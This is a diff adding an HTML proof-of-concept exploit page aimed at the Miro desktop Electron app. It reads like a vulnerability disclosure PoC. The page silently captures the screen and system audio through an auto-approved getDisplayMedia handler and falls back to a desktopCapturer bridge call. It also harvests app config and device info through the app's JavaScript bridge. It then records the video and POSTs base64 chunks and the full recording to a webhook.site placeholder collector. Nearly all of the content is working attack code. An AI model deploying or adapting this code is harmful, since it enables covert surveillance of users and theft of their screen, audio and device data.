@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Loading board...</title>
+<style>
+body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; margin: 0; }
+h1 { color: #e94560; font-size: 18px; }
+.section { margin: 10px 0; padding: 10px; border: 1px solid #333; background: #16213e; }
+.label { color: #e94560; font-weight: bold; }
+.ok { color: #0f0; }
+.err { color: #f00; }
+.warn { color: #ff0; }
+#preview { max-width: 480px; border: 2px solid #e94560; background: #000; }
+#log { white-space: pre-wrap; font-size: 11px; max-height: 200px; overflow-y: auto; }
+</style>
+</head>
+<body>
+<h1>Miro Desktop PoC — Screen + Audio Recording Exfiltration</h1>
+
+<div class="section">
+<span class="label">Chain</span>
+<div id="chain"></div>
+</div>
+
+<div class="section">
+<span class="label">Bridge + Permissions</span>
+<div id="bridge"></div>
+</div>
+
+<div class="section">
+<span class="label">Recording</span>
+<div id="rec-status"></div>
+<video id="preview" autoplay muted playsinline></video>
+</div>
+
+<div class="section">
+<span class="label">Exfiltration</span>
+<div id="exfil"></div>
+</div>
+
+<div class="section">
+<span class="label">Log</span>
+<div id="log"></div>
+</div>
+
+<script>
+/*
+  EXPLOIT FLOW:
+  1. Deep link redirect chain lands this page in Miro's Electron webview
+  2. Webview uses defaultSession → setDisplayMediaRequestHandler auto-approves
+  3. getDisplayMedia() returns live video+audio stream with ZERO user interaction
+  4. MediaRecorder captures webm chunks
+  5. Chunks are exfiltrated in real-time to attacker server
+
+  The handler in main.js (line 136805):
+    session.defaultSession.setDisplayMediaRequestHandler((request, callback) => {
+        callback({ video: request.frame || undefined, audio: 'loopback' });
+    });
+
+  This passes back the requesting frame as video AND system audio as loopback.
+  No picker dialog. No user prompt. Fully silent.
+*/
+
+const EXFIL_URL = 'https://webhook.site/YOUR-UUID-HERE';
+const RECORD_SECONDS = 30;
+const CHUNK_INTERVAL_MS = 5000;
+
+function log(msg) {
+    const el = document.getElementById('log');
+    el.textContent += new Date().toISOString().slice(11,19) + ' ' + msg + '\n';
+    el.scrollTop = el.scrollHeight;
+}
+
+function esc(s) {
+    return String(s).replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+function show(id, cls, html) {
+    document.getElementById(id).innerHTML += '<div class="' + cls + '">' + html + '</div>';
+}
+
+(async function() {
+    // Step 1: Confirm redirect chain
+    show('chain', 'ok',
+        'Location: <b>' + esc(location.href) + '</b><br>' +
+        'Origin: <b>' + esc(location.origin) + '</b>'
+    );
+    log('Page loaded at ' + location.href);
+
+    // Step 2: Detect bridge (confirms we're in the webview)
+    if (typeof _rtb_app_actions_ !== 'undefined') {
+        show('bridge', 'ok', '_rtb_app_actions_ bridge ACCESSIBLE');
+        log('Bridge available');
+    } else {
+        show('bridge', 'warn', 'Bridge not found (still attempting getDisplayMedia)');
+        log('Bridge not found — but getDisplayMedia may still work via session handler');
+    }
+
+    // Step 3: Also grab screenshots + metadata via bridge (if available)
+    const stolen = {};
+    if (typeof _rtb_app_actions_ !== 'undefined') {
+        try { stolen.appConfig = _rtb_app_actions_.getAppConfig(); } catch(e) {}
+        try { stolen.deviceInfo = _rtb_app_actions_.getDeviceInfo(); } catch(e) {}
+        if (stolen.appConfig) show('bridge', 'ok', 'App config: ' + esc(JSON.stringify(stolen.appConfig)));
+        if (stolen.deviceInfo) show('bridge', 'ok', 'Device info: ' + esc(JSON.stringify(stolen.deviceInfo)));
+    }
+
+    // Step 4: Request screen capture via getDisplayMedia
+    // The setDisplayMediaRequestHandler in main.js auto-approves this:
+    //   callback({ video: request.frame, audio: 'loopback' })
+    // No picker. No prompt. Silent.
+    let stream;
+    try {
+        show('rec-status', 'warn', 'Requesting getDisplayMedia()...');
+        log('Calling navigator.mediaDevices.getDisplayMedia()');
+
+        stream = await navigator.mediaDevices.getDisplayMedia({
+            video: {
+                width: { ideal: 1920 },
+                height: { ideal: 1080 },
+                frameRate: { ideal: 15 }
+            },
+            audio: true  // system audio via loopback
+        });
+
+        const videoTracks = stream.getVideoTracks();
+        const audioTracks = stream.getAudioTracks();
+
+        show('rec-status', 'ok',
+            '<b>STREAM ACQUIRED — NO USER PROMPT</b><br>' +
+            'Video tracks: ' + videoTracks.length +
+            ' (' + (videoTracks[0] ? videoTracks[0].label : 'none') + ')<br>' +
+            'Audio tracks: ' + audioTracks.length +
+            ' (' + (audioTracks[0] ? audioTracks[0].label : 'none') + ')'
+        );
+        log('Stream acquired: ' + videoTracks.length + ' video, ' + audioTracks.length + ' audio tracks');
+
+        // Show preview
+        document.getElementById('preview').srcObject = stream;
+
+    } catch(e) {
+        show('rec-status', 'err', 'getDisplayMedia FAILED: ' + esc(e.message));
+        log('getDisplayMedia error: ' + e.name + ': ' + e.message);
+
+        // Fallback: try getUserMedia with desktopCapturer source IDs
+        if (typeof _rtb_app_actions_ !== 'undefined') {
+            show('rec-status', 'warn', 'Falling back to getUserMedia + desktopCapturer source IDs...');
+            try {
+                const sources = await _rtb_app_actions_.getScreenSharingSources({
+                    includeScreens: true,
+                    includeAppWindows: false,
+                    thumbnailWidth: 1,
+                    thumbnailHeight: 1
+                });
+                if (sources.length > 0) {
+                    log('Trying getUserMedia with source: ' + sources[0].id);
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        audio: false,
+                        video: {
+                            mandatory: {
+                                chromeMediaSource: 'desktop',
+                                chromeMediaSourceId: sources[0].id,
+                                maxWidth: 1920,
+                                maxHeight: 1080
+                            }
+                        }
+                    });
+                    show('rec-status', 'ok', '<b>FALLBACK STREAM ACQUIRED</b> (video only, no audio)');
+                    log('Fallback stream acquired');
+                    document.getElementById('preview').srcObject = stream;
+                }
+            } catch(e2) {
+                show('rec-status', 'err', 'Fallback also failed: ' + esc(e2.message));
+                log('Fallback error: ' + e2.message);
+                return;
+            }
+        } else {
+            return;
+        }
+    }
+
+    if (!stream) return;
+
+    // Step 5: Record with MediaRecorder
+    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
+        ? 'video/webm;codecs=vp9,opus'
+        : MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
+            ? 'video/webm;codecs=vp8,opus'
+            : 'video/webm';
+
+    show('rec-status', 'ok', 'Recording with: ' + mimeType);
+    log('MediaRecorder mime: ' + mimeType);
+
+    const recorder = new MediaRecorder(stream, {
+        mimeType: mimeType,
+        videoBitsPerSecond: 1500000
+    });
+
+    let chunkIndex = 0;
+    const allChunks = [];
+
+    recorder.ondataavailable = async function(e) {
+        if (e.data && e.data.size > 0) {
+            allChunks.push(e.data);
+            const idx = chunkIndex++;
+            log('Chunk ' + idx + ': ' + e.data.size + ' bytes');
+            show('exfil', 'warn', 'Sending chunk ' + idx + ' (' + e.data.size + ' bytes)...');
+
+            // Convert to base64 and exfiltrate
+            try {
+                const buf = await e.data.arrayBuffer();
+                const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
+
+                await fetch(EXFIL_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: 'video-chunk',
+                        index: idx,
+                        size: e.data.size,
+                        mime: mimeType,
+                        data: b64,
+                        timestamp: new Date().toISOString()
+                    }),
+                    mode: 'no-cors'
+                });
+                show('exfil', 'ok', 'Chunk ' + idx + ' sent');
+            } catch(err) {
+                show('exfil', 'err', 'Chunk ' + idx + ' send error: ' + esc(err.message));
+            }
+        }
+    };
+
+    recorder.onstop = async function() {
+        show('rec-status', 'ok', '<b>RECORDING STOPPED — ' + allChunks.length + ' chunks captured</b>');
+        log('Recording stopped. Total chunks: ' + allChunks.length);
+
+        // Send the complete video as one blob
+        try {
+            const fullBlob = new Blob(allChunks, { type: mimeType });
+            show('exfil', 'warn', 'Sending full recording (' + fullBlob.size + ' bytes)...');
+
+            const buf = await fullBlob.arrayBuffer();
+            const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
+
+            await fetch(EXFIL_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'video-complete',
+                    chunks: allChunks.length,
+                    totalSize: fullBlob.size,
+                    mime: mimeType,
+                    duration: RECORD_SECONDS,
+                    data: b64,
+                    stolen: stolen,
+                    timestamp: new Date().toISOString()
+                }),
+                mode: 'no-cors'
+            });
+            show('exfil', 'ok', '<b>FULL RECORDING EXFILTRATED (' + fullBlob.size + ' bytes)</b>');
+            log('Full recording exfiltrated: ' + fullBlob.size + ' bytes');
+        } catch(err) {
+            show('exfil', 'err', 'Full recording send error: ' + esc(err.message));
+            log('Full send error: ' + err.message);
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+    };
+
+    // Start recording — chunks every CHUNK_INTERVAL_MS for real-time exfil
+    show('rec-status', 'ok', '<b>RECORDING STARTED</b> — ' + RECORD_SECONDS + 's, chunks every ' + (CHUNK_INTERVAL_MS/1000) + 's');
+    log('Recording started for ' + RECORD_SECONDS + 's');
+    recorder.start(CHUNK_INTERVAL_MS);
+
+    // Stop after RECORD_SECONDS
+    setTimeout(function() {
+        if (recorder.state === 'recording') {
+            recorder.stop();
+        }
+    }, RECORD_SECONDS * 1000);
+
+})();
+</script>
+</body>
+</html>
